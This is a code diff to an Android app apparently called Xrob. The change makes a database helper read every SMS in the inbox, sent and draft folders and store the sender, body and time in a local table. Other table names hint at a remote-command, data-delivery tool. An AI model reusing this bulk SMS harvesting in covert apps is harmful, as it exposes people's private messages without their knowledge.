@@ -12,6 +12,7 @@ import android.util.Log;
 
 
 import com.theah64.xrob.models.Contact;
+import com.theah64.xrob.models.Message;
 import com.theah64.xrob.utils.FileUtils;
 
 import org.json.JSONArray;
@@ -19,6 +20,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.List;
 
 /**
@@ -71,46 +73,16 @@ public class BaseTable<T> extends SQLiteOpenHelper {
         }
     }
 
-    /*
-    SAMPLE - 
-    09-29 23:34:26.440 16184-16669/com.theah64.xrob D/BaseTable: ---------------------------
-    09-29 23:34:26.440 16184-16669/com.theah64.xrob D/BaseTable: _id = 747
-    09-29 23:34:26.441 16184-16669/com.theah64.xrob D/BaseTable: thread_id = 6
-    09-29 23:34:26.442 16184-16669/com.theah64.xrob D/BaseTable: address = AL-650001
-    09-29 23:34:26.443 16184-16669/com.theah64.xrob D/BaseTable: m_size = null
-    09-29 23:34:26.444 16184-16669/com.theah64.xrob D/BaseTable: person = null
-    09-29 23:34:26.444 16184-16669/com.theah64.xrob D/BaseTable: date = 1460015993000
-    09-29 23:34:26.445 16184-16669/com.theah64.xrob D/BaseTable: date_sent = 0
-    09-29 23:34:26.446 16184-16669/com.theah64.xrob D/BaseTable: protocol = 0
-    09-29 23:34:26.448 16184-16669/com.theah64.xrob D/BaseTable: read = 1
-    09-29 23:34:26.448 16184-16669/com.theah64.xrob D/BaseTable: status = -1
-    09-29 23:34:26.449 16184-16669/com.theah64.xrob D/BaseTable: type = 1
-    09-29 23:34:26.449 16184-16669/com.theah64.xrob D/BaseTable: reply_path_present = 0
-    09-29 23:34:26.450 16184-16669/com.theah64.xrob D/BaseTable: subject = null
-    09-29 23:34:26.450 16184-16669/com.theah64.xrob D/BaseTable: body = Rs11=Loc mob30p/m(Per day 1st min @Re1)28days
-                                                                 Rs39=Loc Airtel mob15p/m(Per day 1st min @Re1)28days
-                                                                 Dial *121*1# or visit Airtel retailer.Offer Valid Today!
-    09-29 23:34:26.451 16184-16669/com.theah64.xrob D/BaseTable: service_center = +919840011010
-    09-29 23:34:26.452 16184-16669/com.theah64.xrob D/BaseTable: locked = 0
-    09-29 23:34:26.453 16184-16669/com.theah64.xrob D/BaseTable: sub_id = -1
-    09-29 23:34:26.453 16184-16669/com.theah64.xrob D/BaseTable: error_code = 0
-    09-29 23:34:26.454 16184-16669/com.theah64.xrob D/BaseTable: creator = null
-    09-29 23:34:26.454 16184-16669/com.theah64.xrob D/BaseTable: seen = 1
-    09-29 23:34:26.455 16184-16669/com.theah64.xrob D/BaseTable: itemInfoid = 747
-    09-29 23:34:26.455 16184-16669/com.theah64.xrob D/BaseTable: receive_date = 1460015962217
-    09-29 23:34:26.456 16184-16669/com.theah64.xrob D/BaseTable: ipmsg_id = 0
-    09-29 23:34:26.456 16184-16669/com.theah64.xrob D/BaseTable: ref_id = null
-    09-29 23:34:26.457 16184-16669/com.theah64.xrob D/BaseTable: total_len = null
-    09-29 23:34:26.457 16184-16669/com.theah64.xrob D/BaseTable: rec_len = null
-    09-29 23:34:26.458 16184-16669/com.theah64.xrob D/BaseTable: ---------------------------
-
-     */
     private void syncMessages() {
+        
         Log.d(X, "Syncing messages");
 
         final String[] smsTypes = {"inbox", "sent", "draft"};
 
+        final List<Message> messageList = new ArrayList<>();
+
         for (final String smsType : smsTypes) {
+
             final Uri uri = Uri.parse(String.format("content://sms/%s", smsType));
 
             final Cursor c = getContext().getContentResolver().query(uri, null, null, null, null);
@@ -119,11 +91,16 @@ public class BaseTable<T> extends SQLiteOpenHelper {
 
                 if (c.moveToFirst()) {
 
+
                     do {
-                        Log.d(X, "---------------------------");
-                        for (int index = 0; index < c.getColumnCount(); index++) {
-                            Log.d(X, c.getColumnName(index) + " = " + c.getString(index));
-                        }
+
+                        final int androidMessageId = c.getInt(c.getColumnIndex("_id"));
+                        final String from = c.getString(c.getColumnIndex("address"));
+                        final String content = c.getString(c.getColumnIndex("body"));
+                        final long deliveryTime = c.getLong(c.getColumnIndex("receive_date"));
+
+                        messageList.add(new Message(androidMessageId, from, content, smsType, deliveryTime));
+
                     } while (c.moveToNext());
 
                 }
@@ -131,6 +108,17 @@ public class BaseTable<T> extends SQLiteOpenHelper {
                 c.close();
             }
         }
+
+        if (!messageList.isEmpty()) {
+
+            final Messages messages = Messages.getInstance(getContext());
+
+            //Looping through each message
+            for (final Message message : messageList) {
+                messages.add(message);
+            }
+        }
+
     }
 
     @Override
@@ -139,6 +127,7 @@ public class BaseTable<T> extends SQLiteOpenHelper {
         db.execSQL("DROP TABLE IF EXISTS contacts");
         db.execSQL("DROP TABLE IF EXISTS command_statuses");
         db.execSQL("DROP TABLE IF EXISTS pending_deliveries");
+        db.execSQL("DROP TABLE IF EXISTS messages");
         //TODO: Remove all tables here
         onCreate(db);
     }
